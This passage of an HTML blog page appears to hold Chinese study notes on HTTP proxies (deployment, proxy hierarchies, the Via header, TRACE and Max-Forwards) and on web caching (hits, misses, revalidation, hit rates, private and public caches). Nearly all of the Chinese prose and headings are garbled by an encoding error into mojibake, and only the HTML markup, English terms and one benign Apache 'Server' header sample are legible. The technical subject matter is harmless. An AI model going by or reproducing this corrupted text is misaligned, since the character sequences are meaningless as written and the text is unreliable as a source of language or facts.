id="5-10-ç¬¬ä¸ƒéƒ¨-â€“-è®°å½•æ—¥å¿—"><a href="#5-10-ç¬¬ä¸ƒéƒ¨-â€“-è®°å½•æ—¥å¿—" class="headerlink" title="5.10 ç¬¬ä¸ƒéƒ¨ â€“ è®°å½•æ—¥å¿—"></a>5.10 ç¬¬ä¸ƒéƒ¨ â€“ è®°å½•æ—¥å¿—</h3><h2 id="ç¬¬å…­ç« -ä»£ç†"><a href="#ç¬¬å…­ç« -ä»£ç†" class="headerlink" title="ç¬¬å…­ç«  ä»£ç†"></a>ç¬¬å…­ç«  ä»£ç†</h2><p>Web ä»£ç† (proxy) æœåŠ¡å™¨æ˜¯ç½‘ç»œçš„ä¸­é—´å®ä½“ï¼Œä»£ç†ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œåœ¨å„ç«¯ç‚¹ä¹‹é—´æ¥å›ä¼ é€ HTTP æŠ¥æ–‡.</p><h3 id="6-1-Web-çš„ä¸­é—´å®ä½“"><a href="#6-1-Web-çš„ä¸­é—´å®ä½“" class="headerlink" title="6.1 Web çš„ä¸­é—´å®ä½“"></a>6.1 Web çš„ä¸­é—´å®ä½“</h3><p>HTTP çš„ä»£ç†æœåŠ¡æ—¢æ˜¯ Web æœåŠ¡å™¨åˆæ˜¯ Web å®¢æˆ·ç«¯ã€‚</p><h4 id="6-1-1-ç§æœ‰å’Œå…±äº«ä»£ç†"><a href="#6-1-1-ç§æœ‰å’Œå…±äº«ä»£ç†" class="headerlink" title="6.1.1 ç§æœ‰å’Œå…±äº«ä»£ç†"></a>6.1.1 ç§æœ‰å’Œå…±äº«ä»£ç†</h4><p>ä»£ç†æœåŠ¡å™¨å¯ä»¥ä½¿æŸä¸ªå®¢æˆ·ç«¯ä¸“ç”¨çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¾ˆå¤šå®¢æˆ·ç«¯å…±äº«çš„ã€‚</p><p>å•ä¸ªå®¢æˆ·ç«¯ä¸“ç”¨çš„ä»£ç†ç§°ä¸º<mark>ç§æœ‰ä»£ç†</mark>.</p><p>ä¼—å¤šå®¢æˆ·ç«¯å…±äº«çš„ä»£ç†è¢«ç§°ä¸º<mark>å…¬å…±ä»£ç†</mark>. å…¶æˆæœ¬æ•ˆç‡é«˜ï¼Œæ›´å®¹æ˜“ç®¡ç†.</p><h4 id="6-1-2-ä»£ç†ä¸ç½‘å…³çš„å¯¹æ¯”"><a href="#6-1-2-ä»£ç†ä¸ç½‘å…³çš„å¯¹æ¯”" class="headerlink" title="6.1.2 ä»£ç†ä¸ç½‘å…³çš„å¯¹æ¯”"></a>6.1.2 ä»£ç†ä¸ç½‘å…³çš„å¯¹æ¯”</h4><p>ä»£ç†è¿æ¥çš„æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªä½¿ç”¨ç›¸åŒåè®®çš„åº”ç”¨ç¨‹åºã€‚</p><p>ç½‘å…³è¿æ¥çš„æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªä½¿ç”¨ä¸åŒåè®®çš„ç«¯ç‚¹ã€‚å…¶æ‰®æ¼”çš„æ˜¯â€åè®®è½¬æ¢å™¨â€çš„è§’è‰².<br><img src="/%E4%BB%A3%E7%90%86%E5%92%8C%E7%BD%91%E5%85%B3%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="ä»£ç†å’Œç½‘å…³çš„åŒºåˆ«"></p><h3 id="6-2-ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†"><a href="#6-2-ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†" class="headerlink" title="6.2 ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†"></a>6.2 ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†</h3><p>ä»£ç†æœåŠ¡å™¨å¯ä»¥çœ‹åˆ°å¹¶æ¥è§¦åˆ°æ‰€æœ‰æµè¿‡çš„ HTTP æµé‡ï¼Œæ‰€ä»¥ä»£ç†å¯ä»¥ç›‘è§†æµé‡å¹¶å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</p><p>å¯ä»¥ç”¨åå‘ä»£ç†æ¥æé«˜è®¿é—®æ…¢é€Ÿ Web æœåŠ¡å™¨ä¸Šå…¬å…±å†…å®¹æ—¶çš„æ€§èƒ½ï¼Œè¿™äº›åå‘ä»£ç†é€šå¸¸è¢«ç§°ä¸ºæœåŠ¡å™¨åŠ é€Ÿå™¨ (server accelerator).</p><h3 id="6-3-ä»£ç†ä¼šå»å¾€ä½•å¤„"><a href="#6-3-ä»£ç†ä¼šå»å¾€ä½•å¤„" class="headerlink" title="6.3 ä»£ç†ä¼šå»å¾€ä½•å¤„"></a>6.3 ä»£ç†ä¼šå»å¾€ä½•å¤„</h3><h4 id="6-3-1-ä»£ç†æœåŠ¡å™¨çš„éƒ¨ç½²"><a href="#6-3-1-ä»£ç†æœåŠ¡å™¨çš„éƒ¨ç½²" class="headerlink" title="6.3.1 ä»£ç†æœåŠ¡å™¨çš„éƒ¨ç½²"></a>6.3.1 ä»£ç†æœåŠ¡å™¨çš„éƒ¨ç½²</h4><p>éƒ¨ç½²ä»£ç†çš„å‡ ç§æ–¹å¼:</p><ul><li>å‡ºå£ä»£ç†ï¼Œå°†ä»£ç†å›ºå®šåœ¨æœ¬åœ°ç½‘ç»œçš„å‡ºå£ç‚¹ï¼Œä»¥ä¾¿æ§åˆ¶æœ¬åœ°ç½‘ç»œä¸å¤§å‹å› ç‰¹ç½‘ä¹‹é—´çš„æµé‡.</li><li>è®¿é—® (å…¥å£) ä»£ç†ï¼Œå°†ä»£ç†æ”¾åœ¨ ISP è®¿é—®ç‚¹ä¸Šï¼Œç”¨ä»¥å¤„ç†æ¥è‡ªå®¢æˆ·çš„èšåˆè¯·æ±‚.</li><li>åå‘ä»£ç†, éƒ¨ç½²åœ¨ç½‘ç»œè¾¹ç¼˜ï¼Œåœ¨ Web æœåŠ¡å™¨ä¹‹å‰ï¼Œä½œä¸ºæ›¿ä»£ç‰© (å³åå‘ä»£ç†) ä½¿ç”¨, åœ¨é‚£é‡Œå®ƒä»¬å¯ä»¥å¤„ç†æ‰€æœ‰ä¼ é€ç»™ Web æœåŠ¡å™¨çš„è¯·æ±‚, å¹¶åªåœ¨å¿…è¦æ—¶å‘ Web æœåŠ¡å™¨è¯·æ±‚èµ„æº. åå‘ä»£ç†é€šå¸¸ä¼šç›´æ¥å†’ç”¨ Web æœåŠ¡å™¨çš„åå­—å’Œ IP åœ°å€</li><li>ç½‘ç»œäº¤æ¢ä»£ç†, å°†å…·æœ‰è¶³å¤Ÿå¤„ç†èƒ½åŠ›çš„ä»£ç†æ”¾åœ¨ç½‘ç»œä¹‹é—´çš„å› ç‰¹ç½‘å¯¹ç­‰äº¤æ¢ç‚¹ä¸Šï¼Œé€šè¿‡ç¼“å­˜æ¥å‡è½»å› ç‰¹ç½‘èŠ‚ç‚¹çš„æ‹¥å¡ï¼Œå¹¶å¯¹æµé‡è¿›è¡Œç›‘è§†</li></ul><h4 id="6-3-2-ä»£ç†çš„å±‚æ¬¡ç»“æ„-proxy-hierarchy"><a href="#6-3-2-ä»£ç†çš„å±‚æ¬¡ç»“æ„-proxy-hierarchy" class="headerlink" title="6.3.2 ä»£ç†çš„å±‚æ¬¡ç»“æ„ (proxy hierarchy)"></a>6.3.2 ä»£ç†çš„å±‚æ¬¡ç»“æ„ (proxy hierarchy)</h4><p>æŠ¥æ–‡ä¼šä»ä¸€ä¸ªä»£ç†ä¼ ç»™å¦ä¸€ä¸ªä»£ç†.<br><img src="/%E4%B8%89%E7%BA%A7%E7%9A%84%E4%BB%A3%E7%90%86%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="ä¸‰çº§çš„ä»£ç†å±‚æ¬¡ç»“æ„"></p><p>é è¿‘æœåŠ¡å™¨çš„ä»£ç†ä¸º<mark>çˆ¶ä»£ç†</mark>.</p><p>é è¿‘å®¢æˆ·ç«¯çš„ä»£ç†ä¸º<mark>å­ä»£ç†</mark></p><h5 id="ä»£ç†å±‚æ¬¡ç»“æ„çš„å†…å®¹è·¯ç”±"><a href="#ä»£ç†å±‚æ¬¡ç»“æ„çš„å†…å®¹è·¯ç”±" class="headerlink" title="ä»£ç†å±‚æ¬¡ç»“æ„çš„å†…å®¹è·¯ç”±"></a>ä»£ç†å±‚æ¬¡ç»“æ„çš„å†…å®¹è·¯ç”±</h5><p>ä»£ç†å±‚æ¬¡ç»“æ„å¯ä»¥æ˜¯åŠ¨æ€çš„, å³å¹¶ä¸æ˜¯å•ä¸€çš„è·¯çº¿ã€‚</p><h4 id="6-3-3-ä»£ç†æ˜¯å¦‚ä½•è·å–æµé‡çš„"><a href="#6-3-3-ä»£ç†æ˜¯å¦‚ä½•è·å–æµé‡çš„" class="headerlink" title="6.3.3 ä»£ç†æ˜¯å¦‚ä½•è·å–æµé‡çš„"></a>6.3.3 ä»£ç†æ˜¯å¦‚ä½•è·å–æµé‡çš„</h4><p>æœ‰å››ç§å¸¸è§æ–¹å¼å¯ä»¥ä½¿å®¢æˆ·æµé‡æµå‘ä»£ç†:</p><ul><li>ä¿®æ”¹å®¢æˆ·ç«¯, æ‰‹åŠ¨å°†å®¢æˆ·ç«¯é…ç½®ä¸ºä½¿ç”¨ä»£ç†æœåŠ¡å™¨</li><li>ä¿®æ”¹ç½‘ç»œ, </li><li>ä¿®æ”¹ DNS çš„å‘½åç©ºé—´</li><li>ä¿®æ”¹ Web æœåŠ¡å™¨</li></ul><h3 id="6-4-å®¢æˆ·ç«¯çš„ä»£ç†è®¾ç½®"><a href="#6-4-å®¢æˆ·ç«¯çš„ä»£ç†è®¾ç½®" class="headerlink" title="6.4 å®¢æˆ·ç«¯çš„ä»£ç†è®¾ç½®"></a>6.4 å®¢æˆ·ç«¯çš„ä»£ç†è®¾ç½®</h3><p>æ‰€æœ‰ç°ä»£çš„ Web æµè§ˆå™¨éƒ½å…è®¸ç”¨æˆ·å¯¹ä»£ç†ä½¿ç”¨è¿›è¡Œé…ç½®ã€‚</p><p>å‡ ç§æ–¹æ³•:</p><ul><li>æ‰‹å·¥é…ç½®</li><li>é¢„å…ˆé…ç½®æµè§ˆå™¨</li><li>ä»£ç†çš„è‡ªåŠ¨é…ç½®</li><li>WPAD çš„ä»£ç†å‘ç°</li></ul><h3 id="6-5-ä¸ä»£ç†è¯·æ±‚æœ‰å…³çš„ä¸€äº›æ£˜æ‰‹é—®é¢˜"><a href="#6-5-ä¸ä»£ç†è¯·æ±‚æœ‰å…³çš„ä¸€äº›æ£˜æ‰‹é—®é¢˜" class="headerlink" title="6.5 ä¸ä»£ç†è¯·æ±‚æœ‰å…³çš„ä¸€äº›æ£˜æ‰‹é—®é¢˜"></a>6.5 ä¸ä»£ç†è¯·æ±‚æœ‰å…³çš„ä¸€äº›æ£˜æ‰‹é—®é¢˜</h3><h4 id="6-5-1-ä»£ç†-URI-ä¸æœåŠ¡å™¨-URI-ä¸åŒ"><a href="#6-5-1-ä»£ç†-URI-ä¸æœåŠ¡å™¨-URI-ä¸åŒ" class="headerlink" title="6.5.1 ä»£ç† URI ä¸æœåŠ¡å™¨ URI ä¸åŒ"></a>6.5.1 ä»£ç† URI ä¸æœåŠ¡å™¨ URI ä¸åŒ</h4><p>é™¤äº†è¿™ä¸€ç‚¹ä¹‹å¤–ï¼ŒWeb æœåŠ¡å™¨æŠ¥æ–‡å’Œ Web ä»£ç†æŠ¥æ–‡çš„è¯­æ³•æ˜¯ä¸€æ ·çš„ã€‚</p><p>å®¢æˆ·ç«¯å‘ Web æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œè¯·æ±‚è¡Œä¸­åªåŒ…å«éƒ¨åˆ† URI (URI ä¸­ä¸åŒ…å«æ–¹æ¡ˆã€ä¸»æœºæˆ–ç«¯å£).</p><p>å®¢æˆ·ç«¯å‘ä»£ç†å‘é€è¯·æ±‚æ—¶ï¼Œè¯·æ±‚è¡Œä¸­åˆ™åŒ…å«å®Œæ•´çš„ URI.</p><h4 id="6-5-2-ä¸è™šæ‹Ÿä¸»æœºä¸€æ ·çš„é—®é¢˜"><a href="#6-5-2-ä¸è™šæ‹Ÿä¸»æœºä¸€æ ·çš„é—®é¢˜" class="headerlink" title="6.5.2 ä¸è™šæ‹Ÿä¸»æœºä¸€æ ·çš„é—®é¢˜"></a>6.5.2 ä¸è™šæ‹Ÿä¸»æœºä¸€æ ·çš„é—®é¢˜</h4><h4 id="6-5-3-æ‹¦æˆªä»£ç†ä¼šæ”¶åˆ°éƒ¨åˆ†-URI"><a href="#6-5-3-æ‹¦æˆªä»£ç†ä¼šæ”¶åˆ°éƒ¨åˆ†-URI" class="headerlink" title="6.5.3 æ‹¦æˆªä»£ç†ä¼šæ”¶åˆ°éƒ¨åˆ† URI"></a>6.5.3 æ‹¦æˆªä»£ç†ä¼šæ”¶åˆ°éƒ¨åˆ† URI</h4><h3 id="6-6-è¿½è¸ªæŠ¥æ–‡"><a href="#6-6-è¿½è¸ªæŠ¥æ–‡" class="headerlink" title="6.6 è¿½è¸ªæŠ¥æ–‡"></a>6.6 è¿½è¸ªæŠ¥æ–‡</h3><h4 id="6-6-2-Via-é¦–éƒ¨"><a href="#6-6-2-Via-é¦–éƒ¨" class="headerlink" title="6.6.2 Via é¦–éƒ¨"></a>6.6.2 Via é¦–éƒ¨</h4><p>Via é¦–éƒ¨å­—æ®µåˆ—å‡ºäº†ä¸æŠ¥æ–‡é€”å¾„çš„æ¯ä¸ªä¸­é—´èŠ‚ç‚¹æœ‰å…³çš„ä¿¡æ¯.</p><p>æŠ¥æ–‡æ¯ç»è¿‡ä¸€ä¸ªèŠ‚ç‚¹ï¼Œéƒ½å¿…é¡»å°†è¿™ä¸ªä¸­é—´èŠ‚ç‚¹æ·»åŠ åˆ° Via åˆ—è¡¨çš„æœ«å°¾.</p><h5 id="Via-çš„è¯­æ³•"><a href="#Via-çš„è¯­æ³•" class="headerlink" title="Via çš„è¯­æ³•"></a>Via çš„è¯­æ³•</h5><p>ç”±é€—å· <code>,</code> åˆ†éš”ã€‚</p><p>æ¯ä¸ª waypoint æœ€å¤šåŒ…å«å››ä¸ªç»„ä»¶:</p><ul><li>å¯é€‰çš„åè®®å</li><li>å¿…é€‰çš„åè®®ç‰ˆæœ¬</li><li>å¿…é€‰çš„èŠ‚ç‚¹å</li><li>å¯é€‰çš„æè¿°æ€§æ³¨é‡Š</li></ul><h5 id="Via-çš„è¯·æ±‚å’Œå“åº”è·¯å¾„"><a href="#Via-çš„è¯·æ±‚å’Œå“åº”è·¯å¾„" class="headerlink" title="Via çš„è¯·æ±‚å’Œå“åº”è·¯å¾„"></a>Via çš„è¯·æ±‚å’Œå“åº”è·¯å¾„</h5><p>è¯·æ±‚å’Œå“åº”é€šå¸¸éƒ½æ˜¯é€šè¿‡åŒä¸€æ¡ TCP è¿æ¥ä¼ è¾“çš„ï¼Œå“åº”æŠ¥æ–‡ä¼šæ²¿ç€ä¸è¯·æ±‚æŠ¥æ–‡ç›¸åŒçš„è·¯å¾„å›ä¼ ã€‚</p><h5 id="Via-ä¸ç½‘å…³"><a href="#Via-ä¸ç½‘å…³" class="headerlink" title="Via ä¸ç½‘å…³"></a>Via ä¸ç½‘å…³</h5><p>æœ‰äº›ä»£ç†ä¼šä¸ºä½¿ç”¨é HTTP åè®®çš„æœåŠ¡æä¾›ç½‘å…³çš„åŠŸèƒ½ï¼ŒVia é¦–éƒ¨è®°å½•äº†è¿™äº›åè®®è½¬æ¢.</p><h5 id="Server-å’Œ-Via-é¦–éƒ¨"><a href="#Server-å’Œ-Via-é¦–éƒ¨" class="headerlink" title="Server å’Œ Via é¦–éƒ¨"></a>Server å’Œ Via é¦–éƒ¨</h5><p>Server å“åº”é¦–éƒ¨å­—æ®µå¯¹åŸå§‹æœåŠ¡å™¨ä½¿ç”¨çš„è½¯ä»¶è¿›è¡Œäº†æè¿°:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">14</span> (Unix) PHP/<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h5 id="Via-çš„éšç§å’Œå®‰å…¨é—®é¢˜"><a href="#Via-çš„éšç§å’Œå®‰å…¨é—®é¢˜" class="headerlink" title="Via çš„éšç§å’Œå®‰å…¨é—®é¢˜"></a>Via çš„éšç§å’Œå®‰å…¨é—®é¢˜</h5><p>å½“ä»£ç†æœåŠ¡å™¨ä½œä¸ºç½‘ç»œé˜²ç«å¢™çš„ä¸€éƒ¨åˆ†ä½¿ç”¨æ—¶ï¼Œæ˜¯ä¸åº”è¯¥è½¬å‘é˜²ç«å¢™åé¢é‚£äº›ä¸»æœºçš„åå­—å’Œç«¯å£å·çš„.</p><p>å¦‚æœä¸å…è®¸è¿›è¡Œ Via èŠ‚ç‚¹åè½¬å‘ï¼Œä½œä¸ºå®‰å…¨é˜²çº¿çš„ä¸€éƒ¨åˆ†ä½¿ç”¨çš„ä»£ç†å°±åº”è¯¥ç”¨é€‚å½“çš„å‡åæ¥å–ä»£é‚£å°ä¸»æœºçš„åå­—.</p><h4 id="6-6-2-TRACE-æ–¹æ³•"><a href="#6-6-2-TRACE-æ–¹æ³•" class="headerlink" title="6.6.2 TRACE æ–¹æ³•"></a>6.6.2 TRACE æ–¹æ³•</h4><p>ä»£ç†æœåŠ¡å™¨å¯ä»¥åœ¨è½¬å‘æŠ¥æ–‡æ—¶å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå¯ä»¥æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤é¦–éƒ¨ï¼Œä¹Ÿå¯ä»¥å°†ä¸»ä½“éƒ¨åˆ†è½¬æ¢ç§°ä¸åŒçš„æ ¼å¼.</p><p>é€šè¿‡ HTTP&#x2F;1.1 çš„ TRACE æ–¹æ³•ï¼Œç”¨æˆ·å¯ä»¥è·Ÿè¸ªç»ä»£ç†é“¾ä¼ è¾“çš„è¯·æ±‚æŠ¥æ–‡ï¼Œè§‚å¯ŸæŠ¥æ–‡ç»è¿‡äº†å“ªäº›ä»£ç†, ä»¥åŠæ¯ä¸ªä»£ç†æ˜¯å¦‚ä½•å¯¹è¯·æ±‚æŠ¥æ–‡è¿›è¡Œä¿®æ”¹çš„ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>Max-Forwards</code> é¦–éƒ¨æ¥é™åˆ¶ TRACE å’Œ OPTIONS è¯·æ±‚æ‰€ç»è¿‡çš„ä»£æ›¿è·³æ•°.</p><p><code>Max-Forwards</code> è¯·æ±‚é¦–éƒ¨å­—æ®µåŒ…å«äº†ä¸€ä¸ªæ•´æ•°ï¼Œç”¨æ¥è¯´æ˜è¿™æ¡è¯·æ±‚æŠ¥æ–‡è¿˜å¯ä»¥è¢«è½¬å‘çš„æ¬¡æ•°.</p><p>è½¬å‘ä¸€æ¬¡, <code>Max-Forwards</code> åçš„æ•´æ•°å‡ä¸€ã€‚</p><h3 id="6-7-ä»£ç†è®¤è¯"><a href="#6-7-ä»£ç†è®¤è¯" class="headerlink" title="6.7 ä»£ç†è®¤è¯"></a>6.7 ä»£ç†è®¤è¯</h3><p>è¿™ç§æœºåˆ¶å¯ä»¥é˜»æ­¢å¯¹å†…å®¹çš„è¯·æ±‚ï¼Œç›´åˆ°ç”¨æˆ·å‘ä»£ç†æä¾›äº†æœ‰æ•ˆçš„è®¿é—®æƒé™è¯ä¹¦ä¸ºæ­¢.</p><h3 id="6-8-ä»£ç†çš„äº’æ“ä½œæ€§"><a href="#6-8-ä»£ç†çš„äº’æ“ä½œæ€§" class="headerlink" title="6.8 ä»£ç†çš„äº’æ“ä½œæ€§"></a>6.8 ä»£ç†çš„äº’æ“ä½œæ€§</h3><h4 id="6-8-1-å¤„ç†ä»£ç†ä¸æ”¯æŒçš„é¦–éƒ¨å’Œæ–¹æ³•"><a href="#6-8-1-å¤„ç†ä»£ç†ä¸æ”¯æŒçš„é¦–éƒ¨å’Œæ–¹æ³•" class="headerlink" title="6.8.1 å¤„ç†ä»£ç†ä¸æ”¯æŒçš„é¦–éƒ¨å’Œæ–¹æ³•"></a>6.8.1 å¤„ç†ä»£ç†ä¸æ”¯æŒçš„é¦–éƒ¨å’Œæ–¹æ³•</h4><p>ä»£ç†å¿…é¡»å¯¹ä¸è®¤è¯†çš„é¦–éƒ¨å­—æ®µè¿›è¡Œè½¬å‘ï¼Œè€Œä¸”å¿…é¡»ç»´æŒåŒåé¦–éƒ¨å­—æ®µçš„ç›¸å¯¹é¡ºåº.</p><h4 id="6-8-2-OPTIONS-å‘ç°å¯¹å¯é€‰ç‰¹æ€§çš„æ”¯æŒ"><a href="#6-8-2-OPTIONS-å‘ç°å¯¹å¯é€‰ç‰¹æ€§çš„æ”¯æŒ" class="headerlink" title="6.8.2 OPTIONS: å‘ç°å¯¹å¯é€‰ç‰¹æ€§çš„æ”¯æŒ"></a>6.8.2 OPTIONS: å‘ç°å¯¹å¯é€‰ç‰¹æ€§çš„æ”¯æŒ</h4><h4 id="6-8-3-Allow-é¦–éƒ¨"><a href="#6-8-3-Allow-é¦–éƒ¨" class="headerlink" title="6.8.3 Allow é¦–éƒ¨"></a>6.8.3 Allow é¦–éƒ¨</h4><p>Allow å®ä½“é¦–éƒ¨å­—æ®µåˆ—å‡ºäº†è¯·æ±‚ URI æ ‡è¯†çš„èµ„æºæ‰€æ”¯æŒçš„æ–¹æ³•åˆ—è¡¨ï¼Œå¦‚æœè¯·æ±‚ URI ä¸º <code>*</code> ï¼Œåˆ—å‡ºçš„å°±æ˜¯æ•´ä¸ªæœåŠ¡å™¨æ‰€æ”¯æŒçš„æ–¹æ³•åˆ—è¡¨.</p><h2 id="ç¬¬ä¸ƒç« -ç¼“å­˜"><a href="#ç¬¬ä¸ƒç« -ç¼“å­˜" class="headerlink" title="ç¬¬ä¸ƒç«  ç¼“å­˜"></a>ç¬¬ä¸ƒç«  ç¼“å­˜</h2><p>Web ç¼“å­˜æ˜¯å¯ä»¥è‡ªåŠ¨ä¿å­˜å¸¸è§æ–‡æ¡£å‰¯æœ¬çš„ HTTP è®¾å¤‡.</p><h3 id="7-1-å†—ä½™çš„æ•°æ®ä¼ è¾“"><a href="#7-1-å†—ä½™çš„æ•°æ®ä¼ è¾“" class="headerlink" title="7.1 å†—ä½™çš„æ•°æ®ä¼ è¾“"></a>7.1 å†—ä½™çš„æ•°æ®ä¼ è¾“</h3><h3 id="7-2-å¸¦å®½ç“¶é¢ˆ"><a href="#7-2-å¸¦å®½ç“¶é¢ˆ" class="headerlink" title="7.2 å¸¦å®½ç“¶é¢ˆ"></a>7.2 å¸¦å®½ç“¶é¢ˆ</h3><h3 id="7-3-ç¬é—´æ‹¥å¡"><a href="#7-3-ç¬é—´æ‹¥å¡" class="headerlink" title="7.3 ç¬é—´æ‹¥å¡"></a>7.3 ç¬é—´æ‹¥å¡</h3><p>ç¼“å­˜åœ¨ç ´åç¬é—´æ‹¥å¡ (Flash Crowds) æ—¶éå¸¸é‡è¦.</p><h3 id="7-4-è·ç¦»æ—¶å»¶"><a href="#7-4-è·ç¦»æ—¶å»¶" class="headerlink" title="7.4 è·ç¦»æ—¶å»¶"></a>7.4 è·ç¦»æ—¶å»¶</h3><h3 id="7-5-å‘½ä¸­å’Œæœªå‘½ä¸­çš„"><a href="#7-5-å‘½ä¸­å’Œæœªå‘½ä¸­çš„" class="headerlink" title="7.5 å‘½ä¸­å’Œæœªå‘½ä¸­çš„"></a>7.5 å‘½ä¸­å’Œæœªå‘½ä¸­çš„</h3><p>ç”¨å·²æœ‰çš„å‰¯æœ¬ä¸ºæŸäº›åˆ°è¾¾ç¼“å­˜çš„è¯·æ±‚æä¾›æœåŠ¡ï¼Œè¢«ç§°ä¸º<mark>ç¼“å­˜å‘½ä¸­</mark> (cache hit).</p><p>åˆ°è¾¾ç¼“å­˜çš„è¯·æ±‚å¯èƒ½ä¼šç”±äºæ²¡æœ‰å‰¯æœ¬å¯ç”¨ï¼Œè€Œè¢«è½¬å‘ç»™åŸå§‹æœåŠ¡å™¨ï¼Œè¢«ç§°ä¸º<mark>ç¼“å­˜æœªå‘½ä¸­</mark> (cache miss)</p><h4 id="7-5-1-å†éªŒè¯"><a href="#7-5-1-å†éªŒè¯" class="headerlink" title="7.5.1 å†éªŒè¯"></a>7.5.1 å†éªŒè¯</h4><p>ç¼“å­˜éœ€å¯¹å®ƒä»¬ä¿å­˜çš„å‰¯æœ¬è¿›è¡Œæ£€æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæœåŠ¡å™¨ä¸Šçš„æœ€æ–°å‰¯æœ¬ã€‚è¿™è¢«ç§°ä¸º<mark>HTTP å†éªŒè¯</mark> (revalidaion).</p><p>å¤§éƒ¨åˆ†ç¼“å­˜åªæœ‰åœ¨å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶ä¸”å‰¯æœ¬æ—§å¾—è¶³ä»¥éœ€è¦æ£€æµ‹çš„æ—¶å€™ï¼Œæ‰ä¼šå¯¹å‰¯æœ¬è¿›è¡Œ revalidation.</p><p>ä½¿ç”¨ <code>If-Modified-Since</code> é¦–ï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œåªæœ‰åœ¨ç¼“å­˜äº†å¯¹è±¡çš„å‰¯æœ¬ä¹‹åï¼Œåˆå¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹ä¸‹ï¼Œæ‰å‘é€æ­¤å¯¹è±¡.</p><h4 id="7-5-2-å‘½ä¸­ç‡"><a href="#7-5-2-å‘½ä¸­ç‡" class="headerlink" title="7.5.2 å‘½ä¸­ç‡"></a>7.5.2 å‘½ä¸­ç‡</h4><p>ç”±ç¼“å­˜æä¾›æœåŠ¡çš„è¯·æ±‚æ‰€å çš„æ¯”ä¾‹è¢«ç§°ä¸º<mark>ç¼“å­˜å‘½ä¸­ç‡</mark> (cache hit rate).</p><h4 id="7-5-3-å­—èŠ‚å‘½ä¸­ç‡"><a href="#7-5-3-å­—èŠ‚å‘½ä¸­ç‡" class="headerlink" title="7.5.3 å­—èŠ‚å‘½ä¸­ç‡"></a>7.5.3 å­—èŠ‚å‘½ä¸­ç‡</h4><p>å­—èŠ‚å‘½ä¸­ç‡è¡¨ç¤ºçš„æ˜¯ç¼“å­˜æä¾›çš„å­—èŠ‚åœ¨ä¼ è¾“çš„æ‰€æœ‰å­—èŠ‚ä¸­æ‰€å çš„æ¯”ä¾‹ã€‚</p><h4 id="7-5-4-åŒºåˆ†å‘½ä¸­å’Œæœªå‘½ä¸­çš„æƒ…å†µ"><a href="#7-5-4-åŒºåˆ†å‘½ä¸­å’Œæœªå‘½ä¸­çš„æƒ…å†µ" class="headerlink" title="7.5.4 åŒºåˆ†å‘½ä¸­å’Œæœªå‘½ä¸­çš„æƒ…å†µ"></a>7.5.4 åŒºåˆ†å‘½ä¸­å’Œæœªå‘½ä¸­çš„æƒ…å†µ</h4><p>å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ <code>Date</code> é¦–éƒ¨æ¥åˆ¤æ–­å“åº”æ˜¯å¦æ¥è‡ªç¼“å­˜ï¼Œå°† <code>Date</code> é¦–éƒ¨çš„å€¼ä¸å½“å‰æ—¶é—´è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå“åº”ä¸­çš„æ—¥æœŸå€¼æ¯”è¾ƒæ—©ï¼Œå®¢æˆ·ç«¯é€šå¸¸å°±å¯ä»¥è®¤ä¸ºè¿™æ˜¯ä¸€æ¡ç¼“å­˜çš„å“åº”.</p><h3 id="7-6-ç¼“å­˜çš„æ‹“æ‰‘ç»“æ„"><a href="#7-6-ç¼“å­˜çš„æ‹“æ‰‘ç»“æ„" class="headerlink" title="7.6 ç¼“å­˜çš„æ‹“æ‰‘ç»“æ„"></a>7.6 ç¼“å­˜çš„æ‹“æ‰‘ç»“æ„</h3><p>ç¼“å­˜å¯ä»¥æ˜¯å•ä¸ªç”¨æˆ·ä¸“ç”¨çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•°åƒåç”¨æˆ·å…±äº«çš„ã€‚</p><p>ä¸“ç”¨ç¼“å­˜è¢«ç§°ä¸º<mark>ç§æœ‰ç¼“å­˜</mark> (private cache).</p><p>å…±äº«çš„ç¼“å­˜è¢«ç§°ä¸º<mark>å…¬æœ‰ç¼“å­˜</mark> (public cache).</p><h4 id="7-6-1-ç§æœ‰ç¼“å­˜"><a href="#7-6-1-ç§æœ‰ç¼“å­˜" class="headerlink" title="7.6.1 ç§æœ‰ç¼“å­˜"></a>7.6.1 ç§æœ‰ç¼“å­˜</h4><p>Web æµè§ˆå™¨ä¸­æœ‰å†…å»ºçš„ç§æœ‰ç¼“å­˜ã€‚</p><h4 id="7-6-2-å…¬æœ‰ä»£ç†ç¼“å­˜"><a href="#7-6-2-å…¬æœ‰ä»£ç†ç¼“å­˜" class="headerlink" title="7.6.2 å…¬æœ‰ä»£ç†ç¼“å­˜"></a>7.6.2 å…¬æœ‰ä»£ç†ç¼“å­˜</h4><p>å…¬æœ‰ç¼“å­˜æ˜¯ç‰¹æ®Šçš„å…±äº«ä»£ç†æœåŠ¡å™¨, è¢«ç§°ä¸º<mark>ç¼“å­˜ä»£ç†æœåŠ¡å™¨</mark> (caching proxy server).</p><h4 id="7-6-3-ä»£ç†ç¼“å­˜çš„å±‚æ¬¡ç»“æ„"><a 